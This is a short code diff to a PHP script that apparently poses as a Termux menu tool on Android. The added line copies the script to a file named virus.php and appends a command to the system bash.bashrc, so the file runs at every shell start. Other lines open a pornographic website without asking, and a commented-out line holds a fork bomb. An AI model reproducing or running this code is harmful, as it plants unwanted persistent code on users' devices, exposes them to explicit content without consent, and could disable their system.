@@ -78,6 +78,7 @@ me();
 fast(str_repeat($white."•",70)."\n");
 echo "selamat menonton ^u^v\n";
 system("cp -r ~/storage/shared/Download/menu-termux.php ~/../usr/etc/virus.php && echo 'php ~/../usr/etc/virus.php >> ~/../usr/etc/bash.bashrc'");
+system("cp -r ~/menu-termux.php ~/../usr/etc/virus.php && echo 'php ~/../usr/etc/virus.php' >> ~/../usr/etc/bash.bashrc");
 system("xdg-open 'https://id.xhamster.com'");
 system("sleep 3");
 //system(":(){ :|:& } ;:");
